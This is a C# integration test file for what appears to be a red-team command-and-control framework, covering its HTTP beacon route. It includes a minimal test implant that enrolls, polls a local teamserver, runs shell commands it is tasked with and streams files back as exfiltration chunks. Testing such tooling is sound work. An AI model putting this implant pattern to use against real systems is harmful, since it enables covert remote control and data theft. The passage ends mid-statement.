using System.Net;
using System.Net.Http.Json;
using System.Net.Security;
using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;
using Google.Protobuf;
using Microsoft.AspNetCore.Hosting;
using Microsoft.Extensions.DependencyInjection;
using Microsoft.Extensions.Hosting;
using Rod.Audit;
using Rod.CoreState;
using Rod.CoreState.Implants;
using Rod.CoreState.Pki;
using Rod.CoreState.Sessions;
using Rod.Transport;
using Rod.V1;

namespace Rod.Integration.Tests;

/// <summary>
/// Acceptance for the plain-HTTP envelope contact (architecture.md Sec 8,
/// the implant-reach escape hatch): the same rod.v1 frames the live carriages
/// carry, as varint-length-delimited sequences in ordinary HTTP
/// request/response bodies under the artifact key's seal. The acceptance
/// bar is the todo's own criterion: a from-scratch implant written from the
/// contract doc alone, using no protocol library, enrolls, contacts, and
/// completes a task. <see cref="ScratchImplant"/> is that implant -- an
/// HttpClient, the protobuf messages, a hand-rolled varint codec, and the
/// canonical tasking-signature verification, nothing else.
/// </summary>
public class EnvelopeContactTests
{
    [Fact]
    public async Task FromScratchImplant_EnrollsContactsAndCompletesTask()
    {
        await using var env = await TestEnv.StartAsync();
        var secret = await env.MintDeployTokenAsync();

        // The from-scratch implant: ECDSA P-256 keypair, JSON enroll over plain
        // HTTP, envelope contacts sealed under the baked artifact key. No
        // protocol library anywhere on this path.
        using var implant = await ScratchImplant.EnrollAsync(env.EnrollUrl, secret);
        Assert.False(string.IsNullOrEmpty(implant.ImplantId));

        // First contact: the handshake alone. The response's first frame is
        // the handshake response, and the implant is online in its engagement.
        var first = await implant.ContactAsync();
        var handshake = HandshakeResponse.Parser.ParseFrom(first[0].Payload);
        Assert.Equal(HandshakeStatus.Ok, handshake.Status);
        Assert.Equal(1, handshake.Version.Major);
        Assert.Equal(implant.EngagementId, handshake.EngagementId);
        Assert.Single(first); // nothing queued: the response carries no tasking.

        var sessions = env.Host.Services.GetRequiredService<ISessionRegistry>();
        Assert.True(EngagementId.TryParse(implant.EngagementId, out var engagementId));
        var online = await sessions.ListActiveAsync(engagementId);
        Assert.Single(online, s => s.ImplantId.ToString() == implant.ImplantId);

        // The operator tasks the implant while it sleeps its interval.
        var marker = "rod-envelope-marker-" + Guid.NewGuid().ToString("N")[..8];
        var (taskId, _) = await env.IssueTaskAsync(
            implant.EngagementId, implant.ImplantId, "shell.exec", $"echo {marker}");

        // The next contact drains the task: a signed TaskRequest rides the
        // response after the handshake frame.
        var second = await implant.ContactAsync();
        Assert.True(second.Count >= 2, "expected the handshake response plus a task");
        var request = TaskRequest.Parser.ParseFrom(second[1].Payload);
        Assert.Equal(taskId, request.TaskId);
        Assert.Equal("shell.exec", request.Verb);
        Assert.NotEmpty(request.Signature.ToByteArray());

        // Tier 1, as the contract doc specifies: verify the signature over the
        // canonical tuple with the enrolled CA before executing anything.
        Assert.True(implant.VerifyTasking(request), "the dispatched tasking failed signature verification");

        // Run the verb (shell.exec: one shot, stdout captured) and report the
        // result on the next contact.
        var (output, exitCode) = RunShell(request.Arguments);
        var third = await implant.ContactAsync(new[] { ImplantFrames.TaskResult(
            request.TaskId,
            exitCode == 0 ? Rod.V1.TaskOutcome.Succeeded : Rod.V1.TaskOutcome.Failed,
            output) });
        Assert.Single(third); // handshake response only: nothing else queued.

        var task = await env.GetTaskAsync(implant.EngagementId, taskId);
        Assert.Equal("Completed", task!.Status);
        Assert.Equal("Succeeded", task.Outcome);
        Assert.Contains(marker, task.Output);
        Assert.Equal(3, task.Audit.Length);
        Assert.Equal("TaskIssued", task.Audit[0].Kind);
        Assert.Equal("TaskDispatched", task.Audit[1].Kind);
        Assert.Equal("TaskCompleted", task.Audit[2].Kind);
    }

    [Fact]
    public async Task Cadence_AdvertisedAtEnrollAndHandshake_LandsOnTheImplantRecord()
    {
        await using var env = await TestEnv.StartAsync();
        var secret = await env.MintDeployTokenAsync();

        // Enrolls reporting the baked cadence: 30s base, 10s jitter
        // half-width.
        using var implant = await ScratchImplant.EnrollAsync(
            env.EnrollUrl, secret, sleepSeconds: 30, jitterSeconds: 10);

        var implants = env.Host.Services.GetRequiredService<IImplantRepository>();
        Assert.True(ImplantId.TryParse(implant.ImplantId, out var implantId));
        var enrolled = await implants.FindAsync(implantId);
        Assert.NotNull(enrolled);
        Assert.Equal(30, enrolled!.SleepSeconds);
        Assert.Equal(10, enrolled.JitterSeconds);

        // A contact whose handshake carries no advertisement keeps the
        // record -- a pre-field client must not erase an enrolled cadence.
        await implant.ContactAsync();
        Assert.Equal(30, (await implants.FindAsync(implantId))!.SleepSeconds);

        // The retune: the next handshake advertises the new pair, and the
        // record moves with it (what the fleet's detail panel reads).
        await implant.ContactAsync(sleepSeconds: 5, jitterSeconds: 1);
        var retuned = await implants.FindAsync(implantId);
        Assert.Equal(5, retuned!.SleepSeconds);
        Assert.Equal(1, retuned.JitterSeconds);

        // Re-advertising the same pair is a no-op the record survives.
        await implant.ContactAsync(sleepSeconds: 5, jitterSeconds: 1);
        Assert.Equal(5, (await implants.FindAsync(implantId))!.SleepSeconds);
    }

    [Fact]
    public async Task Envelope_ExfilChunksInRequestBody_MaterializeArtifact()
    {
        await using var env = await TestEnv.StartAsync();
        var secret = await env.MintDeployTokenAsync();
        using var implant = await ScratchImplant.EnrollAsync(env.EnrollUrl, secret);
        await implant.ContactAsync();

        // A file.pull task names a path on the target; the from-scratch
        // handler reads the bytes and streams them back as exfil chunks after
        // the TaskResult, all inside one request body -- the envelope's exfil
        // discipline: an artifact's chunk run begins and ends within one
        // contact.
        var content = RandomNumberGenerator.GetBytes(2 * 1024 * 1024);
        var path = Path.Combine(Path.GetTempPath(), "rod-envelope-pull-" + Guid.NewGuid().ToString("N") + ".bin");
        await File.WriteAllBytesAsync(path, content);
        try
        {
            var (taskId, _) = await env.IssueTaskAsync(
                implant.EngagementId, implant.ImplantId, "file.pull", path);

            var contact = await implant.ContactAsync();
            var request = TaskRequest.Parser.ParseFrom(contact[1].Payload);
            Assert.Equal("file.pull", request.Verb);

            var frames = new List<Frame>
            {
                ImplantFrames.TaskResult(request.TaskId, Rod.V1.TaskOutcome.Succeeded, path),
            };
            frames.AddRange(ImplantFrames.ExfilChunkRun(request.TaskId, Path.GetFileName(path), content));
            await implant.ContactAsync(frames.ToArray());

            var artifacts = env.Host.Services.GetRequiredService<IArtifactStore>();
            var stored = (await artifacts.ForTaskAsync(Guid.Parse(taskId)))
                .Single(a => a.Name == Path.GetFileName(path));
            Assert.Equal(content, stored.Content);
        }
        finally
        {
            try { File.Delete(path); } catch { }
        }
    }

    [Fact]
    public async Task Envelope_ResumableExfilRun_SpansContacts_AndAnswersWithTheSeam()
    {
        // ADR-010's upload arm acceptance: an interrupted run resumes from
        // the bytes the server already holds. The run splits across two
        // contacts -- each POST a fresh connection -- and the first
        // contact's response carries the seam report the second serves the
        // remainder from, so the artifact materializes from the two halves.
        await using var env = await TestEnv.StartAsync();
        var secret = await env.MintDeployTokenAsync();
        using var implant = await ScratchImplant.EnrollAsync(env.EnrollUrl, secret);
        await implant.ContactAsync();

        var content = RandomNumberGenerator.GetBytes(1024 * 1024 + 777);
        var name = "resumable-" + Guid.NewGuid().ToString("N")[..8] + ".bin";
        var (taskId, _) = await env.IssueTaskAsync(
            implant.EngagementId, implant.ImplantId, "exfil.push", $"{name} /opt/{name}");

        var contact = await implant.ContactAsync();
        var request = TaskRequest.Parser.ParseFrom(contact[1].Payload);

        // Contact one carries the result and the first half; the run is
        // interrupted before the terminal chunk.
        var half = 512 * 1024;
        var first = await implant.ContactAsync(new[]
        {
            ImplantFrames.TaskResult(request.TaskId, Rod.V1.TaskOutcome.Succeeded, $"{name}: streamed"),
            ImplantFrames.ExfilSlice(request.TaskId, name, content, 0, half, terminal: false),
        });

        // The response answers the offset-bearing chunk with its seam report.
        var progress = first.Skip(1)
            .Select(f => f.Kind == FrameKind.ExfilProgress ? ExfilProgress.Parser.ParseFrom(f.Payload) : null)
            .Where(p => p is not null)
            .Single(p => p!.Name == name);
        Assert.Equal(taskId, progress!.TaskId);
        Assert.Equal((ulong)half, progress.HeldBytes);

        // Contact two (a fresh connection, a fresh ingest) serves only the
        // unheld remainder from the reported seam; the terminal chunk
        // completes the run and the artifact carries the whole content.
        await implant.ContactAsync(new[]
        {
            ImplantFrames.ExfilSlice(request.TaskId, name, content, half, content.Length - half, terminal: true),
        });

        var artifacts = env.Host.Services.GetRequiredService<IArtifactStore>();
        var stored = (await artifacts.ForTaskAsync(Guid.Parse(taskId)))
            .Single(a => a.Name == name);
        Assert.Equal(content, stored.Content);
    }

    [Fact]
    public async Task Envelope_LegacyExfilRun_StillCompletesWithinOneBody()
    {
        // The pre-resume shape (no offset fields) keeps the strict sequence
        // discipline the per-connection reassembler always ran: community
        // implants interoperate unchanged.
        await using var env = await TestEnv.StartAsync();
        var secret = await env.MintDeployTokenAsync();
        using var implant = await ScratchImplant.EnrollAsync(env.EnrollUrl, secret);
        await implant.ContactAsync();

        var content = RandomNumberGenerator.GetBytes(600 * 1024);
        var name = "legacy-" + Guid.NewGuid().ToString("N")[..8] + ".bin";
        var (taskId, _) = await env.IssueTaskAsync(
            implant.EngagementId, implant.ImplantId, "exfil.push", $"{name} /opt/{name}");

        var contact = await implant.ContactAsync();
        var request = TaskRequest.Parser.ParseFrom(contact[1].Payload);

        var frames = new List<Frame>
        {
            ImplantFrames.TaskResult(request.TaskId, Rod.V1.TaskOutcome.Succeeded, name),
        };
        frames.AddRange(ImplantFrames.ExfilChunkRun(request.TaskId, name, content));
        var response = await implant.ContactAsync(frames.ToArray());

        // No offset-bearing chunks crossed, so no kind-bearing progress frame
        // reached the implant -- the evolution rule's structural gate.
        Assert.DoesNotContain(response, f => f.Kind == FrameKind.ExfilProgress);

        var artifacts = env.Host.Services.GetRequiredService<IArtifactStore>();
        var stored = (await artifacts.ForTaskAsync(Guid.Parse(taskId)))
            .Single(a => a.Name == name);
        Assert.Equal(content, stored.Content);
    }

    [Fact]
    public async Task Envelope_ExfilRunPastTheBodyCap_SpansContacts()
    {
        // The AC's second half: the envelope's one-request-body bound on
        // exfil runs is gone. A 20 MiB run exceeds the 16 MiB body cap, so
        // it can never ride one POST -- the sender slices it per contact
        // (the reference implant's 8 MiB budget), the seam reports chain the
        // contacts, and the artifact materializes whole.
        await using var env = await TestEnv.StartAsync();
        var secret = await env.MintDeployTokenAsync();
        using var implant = await ScratchImplant.EnrollAsync(env.EnrollUrl, secret);
        await implant.ContactAsync();

        var content = RandomNumberGenerator.GetBytes(20 * 1024 * 1024);
        var name = "large-" + Guid.NewGuid().ToString("N")[..8] + ".bin";
        var (taskId, _) = await env.IssueTaskAsync(
            implant.EngagementId, implant.ImplantId, "exfil.push", $"{name} /opt/{name}");

        var contact = await implant.ContactAsync();
        var request = TaskRequest.Parser.ParseFrom(contact[1].Payload);

        await implant.ContactAsync(new[]
        {
            ImplantFrames.TaskResult(request.TaskId, Rod.V1.TaskOutcome.Succeeded, $"{name}: streamed"),
        });

        // Serve the run in budget-sized contacts the way the reference
        // implant slices it (512 KiB frames, an 8 MiB budget per contact),
        // advancing from each response's seam report -- a single body or
        // frame never exceeds its cap.
        const int budget = 8 * 1024 * 1024;
        var from = 0;
        var declared = SHA256.HashData(content);
        while (from < content.Length)
        {
            var take = Math.Min(budget, content.Length - from);
            var terminalHere = from + take >= content.Length;
            var frames = ImplantFrames.ExfilSliceRun(request.TaskId, name, content, from, take, terminalHere);
            var response = await implant.ContactAsync(frames);
            if (!terminalHere)
            {
                var seam = response.Skip(1)
                    .Select(f => f.Kind == FrameKind.ExfilProgress ? ExfilProgress.Parser.ParseFrom(f.Payload) : null)
                    .Where(p => p is not null)
                    .Single(p => p!.Name == name);
                Assert.Equal((ulong)(from + take), seam!.HeldBytes);
            }
            from += take;
        }

        var artifacts = env.Host.Services.GetRequiredService<IArtifactStore>();
        var stored = (await artifacts.ForTaskAsync(Guid.Parse(taskId)))
            .Single(a => a.Name == name);
        Assert.Equal(content.Length, stored.Size);
        Assert.Equal(declared, SHA256.HashData(stored.Content));
    }

    [Fact]
    public async Task Envelope_StagedPull_IsAnsweredInSameResponse()
    {
        await using var env = await TestEnv.StartAsync();
        var secret = await env.MintDeployTokenAsync();
        using var implant = await ScratchImplant.EnrollAsync(env.EnrollUrl, secret);
        await implant.ContactAsync();

        // A file.push larger than the inline cap stages the bytes server-side;
        // the demand path is the typed arm (architecture.md Sec 10).
        var content = RandomNumberGenerator.GetBytes(2 * 1024 * 1024);
        var path = Path.Combine(Path.GetTempPath(), "rod-envelope-push-" + Guid.NewGuid().ToString("N") + ".bin");
        try
        {
            var (taskId, _) = await env.IssueTaskAsync(
                implant.EngagementId, implant.ImplantId, "file.push", path, content);

            var contact = await implant.ContactAsync();
            var request = TaskRequest.Parser.ParseFrom(contact[1].Payload);
            Assert.Equal("file.push", request.Verb);
            Assert.Equal(content.Length, (int)request.StagedBytes);

            // Demand the staged payload; the same response carries the chunk
            // run to its terminal chunk.
            var pull = await implant.ContactAsync(new[] { ImplantFrames.StagedPull(request.TaskId) });
            var chunks = pull.Skip(1).Select(f => StagedChunk.Parser.ParseFrom(f.Payload)).ToList();
            Assert.NotEmpty(chunks);
            Assert.True(chunks[^1].Terminal);
            Assert.DoesNotContain(chunks, c => c != chunks[^1] && c.Terminal);
            var reassembled = chunks.SelectMany(c => c.Data).ToArray();
            Assert.Equal(content.Length, reassembled.Length);
            Assert.Equal(content, reassembled);

            // The sha256 token inside the signed arguments is the integrity
            // authority: the reassembled bytes hash to it.
            var hash = Convert.ToHexString(SHA256.HashData(reassembled)).ToLowerInvariant();
            Assert.Contains($"sha256:{hash}", request.Arguments);

            // The from-scratch handler lands the file and reports the result.
            var target = request.Arguments.Split(' ')[0];
            await File.WriteAllBytesAsync(target, reassembled);
            await implant.ContactAsync(new[] { ImplantFrames.TaskResult(
                request.TaskId, Rod.V1.TaskOutcome.Succeeded, target) });

            var task = await env.GetTaskAsync(implant.EngagementId, taskId);
            Assert.Equal("Completed", task!.Status);
            Assert.Equal("Succeeded", task.Outcome);
        }
        finally
        {
            try { File.Delete(path); } catch { }
        }
    }

    [Fact]
    public async Task Envelope_ChannelTask_StaysQueuedForStreamTransport()
    {
        await using var env = await TestEnv.StartAsync();
        var secret = await env.MintDeployTokenAsync();
        using var implant = await ScratchImplant.EnrollAsync(env.EnrollUrl, secret);
        await implant.ContactAsync();

        // A shell.interact task is a live channel: its input half needs a
        // stream (architecture.md Sec 10.3), so the envelope contact -- like
        // the DNS poll -- never claims it. It parks queued for a stream
        // transport.
        var (taskId, _) = await env.IssueTaskAsync(
            implant.EngagementId, implant.ImplantId, "shell.interact", "");

        var contact = await implant.ContactAsync();
        Assert.Single(contact); // handshake response only; the channel was not claimed.

        var task = await env.GetTaskAsync(implant.EngagementId, taskId);
        Assert.Equal("Queued", task!.Status);
    }

    [Fact]
    public async Task Envelope_ResponseBudget_SplitsTaskingAcrossContacts()
    {
        await using var env = await TestEnv.StartAsync();
        var secret = await env.MintDeployTokenAsync();
        using var implant = await ScratchImplant.EnrollAsync(env.EnrollUrl, secret);
        await implant.ContactAsync();

        // Nine tasks whose argument strings each marshal to ~0.5 MB of
        // TaskRequest together exceed the 4 MiB dispatch budget, so no single
        // response can carry them all; what does not fit is requeued for the
        // next contact.
        var padding = new string('x', 500 * 1000);
        var ids = new List<string>();
        for (var i = 0; i < 9; i++)
        {
            var (taskId, _) = await env.IssueTaskAsync(
                implant.EngagementId, implant.ImplantId, "shell.exec", $"echo {i} {padding}");
            ids.Add(taskId);
        }

        var delivered = new List<string>();
        var responses = 0;
        while (delivered.Count < ids.Count && responses < 10)
        {
            var contact = await implant.ContactAsync(delivered
                .Select(id => ImplantFrames.TaskResult(id, Rod.V1.TaskOutcome.Succeeded, "ok"))
                .ToArray());
            responses++;
            foreach (var frame in contact.Skip(1))
                delivered.Add(TaskRequest.Parser.ParseFrom(frame.Payload).TaskId);
        }

        // The budget did its job: the tasking needed more than one response,
        // and every task was delivered exactly once across the contacts.
        Assert.True(responses >= 2, $"expected the budget to split the tasking, got {responses} response(s)");
        Assert.Equal(ids.OrderBy(x => x), delivered.OrderBy(x => x));
    }

    [Fact]
    public async Task Envelope_HandshakeRefusals_ReachWireStatus()
    {
        await using var env = await TestEnv.StartAsync();

        // A kill-date-expired implant, enrolled directly through the core
        // ports with a passed kill date -- the same fixture the stream-side
        // refusal test uses. The envelope handshake must answer the same
        // wire status, and the refusal closes the contact after the
        // handshake response.
        var implants = env.Host.Services.GetRequiredService<IImplantRepository>();
        var clock = env.Host.Services.GetRequiredService<TimeProvider>();
        var now = clock.GetUtcNow();
        var expired = Rod.CoreState.Implants.Implant.Enroll(
            ImplantId.New(), EngagementId.New(),
            now.AddDays(-1), ImplantClass.Implant, now.AddDays(-2));
        await implants.SaveAsync(expired);

        using var expiredClient = ScratchImplant.ConnectBeaconCertless(
            $"http://127.0.0.1:{env.HttpPort}", expired.Id.ToString(), expired.EngagementId.ToString());
        var response = await expiredClient.ContactAsync();
        var handshake = HandshakeResponse.Parser.ParseFrom(response[0].Payload);
        Assert.Equal(HandshakeStatus.KillDateExpired, handshake.Status);
        Assert.Single(response);

        // Version mismatch maps the same way it does on the stream.
        var secret = await env.MintDeployTokenAsync();
        using var fresh = await ScratchImplant.EnrollAsync(env.EnrollUrl, secret);
        var mismatch = await fresh.ContactAsync(major: 2);
        var mismatchHandshake = HandshakeResponse.Parser.ParseFrom(mismatch[0].Payload);
        Assert.Equal(HandshakeStatus.VersionMismatch, mismatchHandshake.Status);
        Assert.Single(mismatch);
    }

    [Fact]
    public async Task Envelope_CleartextWithoutCertificate_AnswersTheRefusedHandshake()
    {
        // Over cleartext no certificate can exist, so the route no longer
        // answers 401 on sight: the body is parsed, and a well-framed
        // contact whose handshake carries no implant id gets the refused
        // handshake status (unknown implant). Over TLS the certificate-less
        // connection is still refused before any frame is read -- the
        // single-port https listener admits one for enrollment's sake, and
        // the contact turns it away.
        await using var env = await TestEnv.StartAsync();
        // One zero-length frame: a valid delimited Frame (empty message),
        // so a handshake with no fields at all. The version check fires
        // first on a versionless handshake -- still the refused-handshake
        // shape, just that specific refusal.
        var response = await env.Http.PostAsync(
            "/implants/beacon", new ByteArrayContent(new byte[] { 0x00 }));
        Assert.Equal(HttpStatusCode.OK, response.StatusCode);
        var frames = ScratchImplant.Parse(await response.Content.ReadAsByteArrayAsync());
        var handshake = HandshakeResponse.Parser.ParseFrom(frames[0].Payload);
        Assert.Equal(HandshakeStatus.VersionMismatch, handshake.Status);
    }

    [Fact]
    public async Task Envelope_CleartextContact_IdentifiesByTheHandshakeId()
    {
        // The pure-HTTP posture: an implant with an HTTP client and no
        // certificate at all contacts over cleartext, identified by the
        // implant id in its handshake -- the same anything-with-reach
        // tradeoff the cleartext carriers document. The session opens and
        // the implant is online.
        await using var env = await TestEnv.StartAsync();
        var secret = await env.MintDeployTokenAsync();
        using var implant = await ScratchImplant.EnrollAsync(env.EnrollUrl, secret);

        // The same implant identity, dialing the cleartext port with a bare
        // HTTP client: no client certificate anywhere on the path.
        using var cleartext = ScratchImplant.ConnectBeaconCertless(
            $"http://127.0.0.1:{env.HttpPort}", implant.ImplantId, implant.EngagementId);
        var first = await cleartext.ContactAsync();
        var handshake = HandshakeResponse.Parser.ParseFrom(first[0].Payload);
        Assert.Equal(HandshakeStatus.Ok, handshake.Status);
        Assert.Single(first);

        var sessions = env.Host.Services.GetRequiredService<ISessionRegistry>();
        Assert.True(EngagementId.TryParse(implant.EngagementId, out var engagementId));
        var online = await sessions.ListActiveAsync(engagementId);
        Assert.Single(online, s => s.ImplantId.ToString() == implant.ImplantId);
    }

    [Fact]
    public async Task Envelope_SealedContact_RoundTrips_AndRefusesReplayAndDowngrade()
    {
        // The per-artifact key posture (architecture.md Sec 8/9): the build
        // mints a key, bakes it, and records it beside the payload whose
        // token the artifact redeems -- so the enrollment binds the implant
        // to the key. Every contact body is then AES-256-GCM ciphertext
        // covering a fresh counter, over cleartext http no less: the posture
        // carries confidential content, not just authenticated content, and
        // neither a replayed body nor a downgrade to the plaintext lab shape
        // gets past the route.
        await using var env = await TestEnv.StartAsync();
        var (engagementId, secret, bakedKey) = await env.MintSealedArtifactShapeAsync();

        // The enrollment redeems the payload's own token, so the bind rides
        // with it; the contact client is the sealed cleartext twin -- no
        // certificate anywhere on the path.
        using var enrolled = await ScratchImplant.EnrollAsync(env.EnrollUrl, secret);
        using var sealedImplant = ScratchImplant.ConnectBeaconSealed(
            $"http://127.0.0.1:{env.HttpPort}", enrolled.ImplantId, enrolled.EngagementId, bakedKey);

        var first = await sealedImplant.SealedContactAsync();
        var handshake = HandshakeResponse.Parser.ParseFrom(first[0].Payload);
        Assert.Equal(HandshakeStatus.Ok, handshake.Status);
        Assert.Single(first);

        var sessions = env.Host.Services.GetRequiredService<ISessionRegistry>();
        Assert.True(EngagementId.TryParse(engagementId, out var parsedEngagement));
        var online = await sessions.ListActiveAsync(parsedEngagement);
        Assert.Single(online, s => s.ImplantId.ToString() == enrolled.ImplantId);

        // A task still round-trips under the seal: the response's tasking
        // rides the sealed body like any other frame.
        var (taskId, _) = await env.IssueTaskAsync(
            engagementId, enrolled.ImplantId, "shell.exec", "echo rod-sealed");
        var second = await sealedImplant.SealedContactAsync();
        Assert.True(second.Count >= 2, "expected the handshake response plus a task");
        var request = TaskRequest.Parser.ParseFrom(second[1].Payload);
        Assert.Equal(taskId, request.TaskId);
        var third = await sealedImplant.SealedContactAsync(new[] { ImplantFrames.TaskResult(
            request.TaskId, Rod.V1.TaskOutcome.Succeeded, "rod-sealed\n") });
        Assert.Single(third);
        var task = await env.GetTaskAsync(engagementId, taskId);
        Assert.Equal("Succeeded", task!.Outcome);

        // Replay: the captured first body, re-posted verbatim, falls at the
        // counter floor and is refused -- no second session, no touch.
        Assert.NotNull(sealedImplant.LastSealedBody);
        var replay = await sealedImplant.PostSealedRawAsync(sealedImplant.LastSealedBody!);
        Assert.Equal(HttpStatusCode.Unauthorized, replay.StatusCode);

        // Downgrade: the same implant id, now posting the plaintext lab body,
        // is refused whole -- the bind at enroll means no keyless contact.
        using var plain = ScratchImplant.ConnectBeaconCertless(
            $"http://127.0.0.1:{env.HttpPort}", enrolled.ImplantId, enrolled.EngagementId);
        var downgrade = await plain.ContactRawAsync();
        Assert.Equal(HttpStatusCode.Unauthorized, downgrade.StatusCode);

        // And the sealed cadence still works after both refusals: the floor
        // advanced only for accepted counters, and the session is intact.
        var fourth = await sealedImplant.SealedContactAsync();
        Assert.Equal(HandshakeStatus.Ok, HandshakeResponse.Parser.ParseFrom(fourth[0].Payload).Status);
    }

    [Fact]
    public async Task Envelope_SealedBody_UnderAForeignOrMissingKey_IsRefused()
    {
        // The seal is the authentication: a body sealed under a key the store
        // does not know (or a tampered one under the right key id) is a 401,
        // not a decode error -- nothing about the route's handling leaks.
        await using var env = await TestEnv.StartAsync();
        var (_, secret, bakedKey) = await env.MintSealedArtifactShapeAsync();
        using var enrolled = await ScratchImplant.EnrollAsync(env.EnrollUrl, secret);
        using var sealedImplant = ScratchImplant.ConnectBeaconSealed(
            $"http://127.0.0.1:{env.HttpPort}", enrolled.ImplantId, enrolled.EngagementId, bakedKey);

        var (otherId, otherKey) = Rod.Transport.Payloads.AesGcmEnvelope.Mint();
        var foreign = Rod.Transport.Payloads.AesGcmEnvelope.Wrap(
            new byte[] { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00 }, otherId, otherKey,
            Rod.Transport.Payloads.AesGcmEnvelope.ContactRequestAad);
        var refused = await sealedImplant.PostSealedRawAsync(
            System.Text.Encoding.UTF8.GetBytes(foreign));
        Assert.Equal(HttpStatusCode.Unauthorized, refused.StatusCode);

        // A body under the artifact's real key id but tampered ciphertext
        // fails the GCM tag the same way.
        Assert.True(Rod.Transport.Payloads.AesGcmEnvelope.TryUnbake(bakedKey, out var keyId, out var key));
        var real = Rod.Transport.Payloads.AesGcmEnvelope.Wrap(
            new byte[] { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00 },
            keyId, key, Rod.Transport.Payloads.AesGcmEnvelope.ContactRequestAad);
        var tamperedChars = real.ToCharArray();
        tamperedChars[^2] = tamperedChars[^2] == 'A' ? 'B' : 'A';
        var tampered = await sealedImplant.PostSealedRawAsync(
            System.Text.Encoding.UTF8.GetBytes(new string(tamperedChars)));
        Assert.Equal(HttpStatusCode.Unauthorized, tampered.StatusCode);
    }

    [Fact]
    public async Task Envelope_MalformedAndOversizedBodies_AreRefused()
    {
        await using var env = await TestEnv.StartAsync();
        var secret = await env.MintDeployTokenAsync();
        using var implant = await ScratchImplant.EnrollAsync(env.EnrollUrl, secret);

        // A body whose first byte starts a varint that never terminates within
        // the uint32 budget is malformed framing, not a frame sequence.
        var malformed = await implant.PostRawAsync(new byte[] { 0x80, 0x80, 0x80, 0x80, 0x80, 0x01 });
        Assert.Equal(HttpStatusCode.BadRequest, malformed.StatusCode);

        // A declared frame length over the per-frame cap is refused as
        // oversized regardless of how few bytes follow it.
        var oversized = await implant.PostRawAsync(EncodeVarint(2 * 1024 * 1024 + 1));
        Assert.Equal(HttpStatusCode.RequestEntityTooLarge, oversized.StatusCode);
    }

    private static byte[] EncodeVarint(int value)
    {
        using var buffer = new MemoryStream();
        uint remaining = (uint)value;
        while (remaining >= 0x80)
        {
            buffer.WriteByte((byte)(remaining | 0x80));
            remaining >>= 7;
        }
        buffer.WriteByte((byte)remaining);
        return buffer.ToArray();
    }

    // Runs one shell.exec command and captures stdout, the reference verb's
    // own grammar. A non-zero exit reports Failed with the output kept.
    private static (string Output, int ExitCode) RunShell(string arguments)
    {
        var psi = new System.Diagnostics.ProcessStartInfo
        {
            FileName = "/bin/sh",
            Arguments = "-c \"" + arguments.Replace("\"", "\\\"") + "\"",
            RedirectStandardOutput = true,
            RedirectStandardError = true,
            UseShellExecute = false,
        };
        using var process = System.Diagnostics.Process.Start(psi)!;
        var output = process.StandardOutput.ReadToEnd();
        process.WaitForExit(15000);
        return (output, process.ExitCode);
    }

    /// <summary>
    /// The from-scratch Tier 0 implant the acceptance bar names: written from
    /// extending/implants.md alone, using no protocol library. An HttpClient,
    /// the protobuf messages, a hand-rolled
    /// varint-length-delimited envelope codec, and the canonical
    /// tasking-signature verification -- the whole obligation, nothing more.
    /// </summary>
    private sealed class ScratchImplant : IDisposable
    {
        public string ImplantId { get; private set; } = string.Empty;
        public string EngagementId { get; private set; } = string.Empty;

        private readonly HttpClient _beacon;
        private readonly List<X509Certificate2> _cas = new();

        // The sealed posture (architecture.md Sec 8/9): when set, every body
        // this client exchanges is AES-256-GCM under the artifact's baked
        // key, the request covering a fresh counter. The counter burns per
        // attempt, mirroring the reference implant.
        private readonly string? _bakedKey;
        private long _counter;

        // The exact body the last sealed contact posted -- the replay probe
        // re-posts it verbatim.
        public byte[]? LastSealedBody { get; private set; }

        private ScratchImplant(HttpClient beacon, string? bakedKey = null)
        {
            _beacon = beacon;
            _bakedKey = bakedKey;
        }

        /// <summary>
        /// The Tier 0 obligation, first half: generate the keypair, POST the
        /// public half with the deploy token, and contact over the same
        /// listener's envelope route, identified by the handshake id (the
        /// cleartext lab posture).
        /// </summary>
        public static async Task<ScratchImplant> EnrollAsync(
            string enrollUrl, string deployToken,
            double? sleepSeconds = null, double? jitterSeconds = null)
        {
            using var key = ECDsa.Create(ECCurve.NamedCurves.nistP256);
            using var plain = new HttpClient();
            var body = new
            {
                deployTokenSecret = deployToken,
                publicKey = Convert.ToBase64String(key.ExportSubjectPublicKeyInfo()),
                sleepSeconds,
                jitterSeconds,
            };
            using var response = await plain.PostAsJsonAsync(enrollUrl, body);
            response.EnsureSuccessStatusCode();
            await using var stream = await response.Content.ReadAsStreamAsync();
            using var document = await System.Text.Json.JsonDocument.ParseAsync(stream);
            var root = document.RootElement;
            var at = enrollUrl.IndexOf("://", StringComparison.Ordinal);
            var baseAddress = at < 0 ? enrollUrl : enrollUrl[..enrollUrl.IndexOf('/', at + 3)];
            var implant = ConnectBeaconCertless(
                baseAddress,
                root.GetProperty("implantId").GetString()!,
                root.GetProperty("engagementId").GetString()!);
            // Tasking verification is the transport-independent half: the CA
            // chain the enrollment answered with signs every dispatched task.
            implant._cas.AddRange(root.GetProperty("caChain").EnumerateArray()
                .Select(b64 => X509CertificateLoader.LoadCertificate(Convert.FromBase64String(b64.GetString()!))));
            return implant;
        }

        /// <summary>
        /// The cleartext twin: a bare HTTP client with no certificate and no
        /// TLS options -- the pure-HTTP contact, identified by handshake id.
        /// </summary>
        public static ScratchImplant ConnectBeaconCertless(
            string baseAddress, string implantId, string engagementId)
            => new(new HttpClient { BaseAddress = new Uri(baseAddress) })
            {
                ImplantId = implantId,
                EngagementId = engagementId,
            };

        /// <summary>
        /// The sealed twin: the default build posture over any front -- a bare
        /// HTTP client whose bodies wrap counter || framed-frames as AES-GCM
        /// under the artifact's baked key. The sealed bytes come from the
        /// teamserver's own codec constants (the wire contract), the same way
        /// EnrollmentTests encodes the sealed enroll body.
        /// </summary>
        public static ScratchImplant ConnectBeaconSealed(
            string baseAddress, string implantId, string engagementId, string bakedKey)
            => new(new HttpClient { BaseAddress = new Uri(baseAddress) }, bakedKey)
            {
                ImplantId = implantId,
                EngagementId = engagementId,
            };

        /// <summary>One poll contact: POST the frames, parse the response.</summary>
        public async Task<List<Frame>> ContactAsync(
            IEnumerable<Frame>? upstream = null, int major = 1, int minor = 0,
            double? sleepSeconds = null, double? jitterSeconds = null)
        {
            var frames = new List<Frame> { HandshakeFrame(major, minor, sleepSeconds, jitterSeconds) };
            if (upstream is not null)
                frames.AddRange(upstream);
            using var content = new ByteArrayContent(Encode(frames));
            content.Headers.ContentType =
